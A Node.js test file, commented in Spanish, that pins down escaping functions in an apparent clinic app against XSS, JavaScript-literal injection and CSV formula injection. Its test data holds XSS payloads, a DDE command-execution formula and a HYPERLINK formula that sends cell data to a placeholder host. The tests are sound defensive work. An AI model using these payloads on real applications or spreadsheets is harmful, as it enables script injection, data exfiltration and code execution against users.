import { test } from 'node:test';
import assert from 'node:assert/strict';
import { esc, escJs, limpiarHtml, neutralizarFormula } from './escape.js';

// El XSS de impresiones.js era un nombre de paciente que se inyectaba crudo en
// el documento de la ventana de impresion (mismo origen que la app, con acceso a
// localStorage y por tanto al token de Supabase). Estos tests fijan el contrato
// de las tres capas de defensa para que la regresion no vuelva a colarse.

test('esc neutraliza el marcado y lo deja visible como texto', () => {
  assert.equal(esc('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.equal(esc('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
  assert.equal(esc('a & b'), 'a &amp; b');
  assert.equal(esc('"citado"'), '&quot;citado&quot;');
  assert.equal(esc("O'Brien"), 'O&#39;Brien');
});

test('esc no altera el texto legitimo de una ficha clinica', () => {
  const nombre = 'MARIA FERNANDEZ';
  const nota = 'Vision 20/20, usa progresivos -0.50 a +1.25';
  assert.equal(esc(nombre), nombre);
  assert.equal(esc(nota), nota);
});

test('esc trata null y undefined como cadena vacia', () => {
  assert.equal(esc(null), '');
  assert.equal(esc(undefined), '');
  assert.equal(esc(0), '0');
  assert.equal(esc(false), 'false');
});

test('limpiarHtml elimina el marcado de lo que se escribe', () => {
  // limpiarHtml borra los caracteres < > ' " en vez de codificarlos. El
  // resultado no es HTML interpretable, que es justo lo que se busca: la
  // etiqueta desaparece aunque el nombre de la etiqueta quede pegado al texto.
  assert.equal(limpiarHtml('<script>alert(1)</script>'), 'scriptalert(1)/script');
  assert.equal(limpiarHtml('<img src=x onerror=alert(1)>'), 'img src=x onerror=alert(1)');
  assert.equal(limpiarHtml('O\'Brien'), 'OBrien');
  assert.equal(limpiarHtml('say "hola"'), 'say hola');
});

test('limpiarHtml deja el texto sin ninguna etiqueta interpretable', () => {
  // Esta es la garantia que importa: tras limpiar, el texto no puede volver a
  // formar una etiqueta por mucho que se combine con lo que le rodee.
  const entradas = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)'"
  ];
  for (const entrada of entradas) {
    const limpio = limpiarHtml(entrada);
    assert.equal(/[<>]/.test(limpio), false, `quedaron delimitadores en: ${limpio}`);
  }
});

test('limpiarHtml conserva el texto clinico normal', () => {
  assert.equal(limpiarHtml('MARIA FERNANDEZ'), 'MARIA FERNANDEZ');
  assert.equal(limpiarHtml('O.D. +1.25 / -0.50 x 175'), 'O.D. +1.25 / -0.50 x 175');
  assert.equal(limpiarHtml('1730504'), '1730504');
});

test('limpiarHtml tolera null y undefined', () => {
  assert.equal(limpiarHtml(null), '');
  assert.equal(limpiarHtml(undefined), '');
});

test('escJs produce un literal de JavaScript que no se puede escapar', () => {
  // Este es el caso del codigo de barras: el valor va DENTRO de un <script>,
  // donde el escape HTML no se decodifica y por tanto no protege.
  assert.equal(escJs('A";alert(1);//'), '"A\\";alert(1);//"');
  assert.equal(escJs('normal'), '"normal"');

  // Lo que se escapa es un literal, no una ejecucion.
  const inyectado = eval(escJs('"; window.__pwned = true; //'));
  assert.equal(inyectado, '"; window.__pwned = true; //');
  assert.equal(globalThis.__pwned, undefined);
});

// --- CSV Injection ---------------------------------------------------------
// Entrecomillar el CSV no impedia que Excel ejecutara una celda que empieza por
// = + - @. Si el optometra abre el archivo con macros habilitadas, el payload se
// ejecuta al abrirlo. Estos tests fijan el contrato.

test('neutralizarFormula protege los prefijos que Excel interpreta como formula', () => {
  const payloads = [
    '=1+1',
    '+1+1',
    '-1+1',
    '@SUM(A1:A2)',
    '=HYPERLINK("https://ejemplo/?d="&A1,"Click")',
    '=cmd|\' /C calc\'!A1'
  ];
  for (const payload of payloads) {
    const salida = neutralizarFormula(payload);
    assert.equal(salida[0], '\'', `debe anteponer apostrofo a: ${payload}`);
    assert.equal(salida.slice(1), payload, 'no debe alterar el contenido original');
  }
});

test('neutralizarFormula deja intactos los datos clinicos normales', () => {
  const valores = [
    'MARIA FERNANDEZ',
    '1730504',
    '12.50',
    'O.D. +1.25 / -0.50 x 175',
    'Agente 0999-911209',
    ''
  ];
  for (const valor of valores) {
    assert.equal(neutralizarFormula(valor), valor, `no debio cambiar: ${valor}`);
  }
});

test('neutralizarFormula solo protege al inicio de la celda', () => {
  // Un '+' o un '=' en medio del texto es inofensivo: solo importa el primer
  // caracter, que es el que Excel lee como inicio de formula.
  assert.equal(neutralizarFormula('ANCA+1'), 'ANCA+1');
  assert.equal(neutralizarFormula('A=B'), 'A=B');
});

test('neutralizarFormula tolera null, undefined y numeros', () => {
  assert.equal(neutralizarFormula(null), '');
  assert.equal(neutralizarFormula(undefined), '');
  assert.equal(neutralizarFormula(0), '0');
  assert.equal(neutralizarFormula(12.5), '12.5');
});
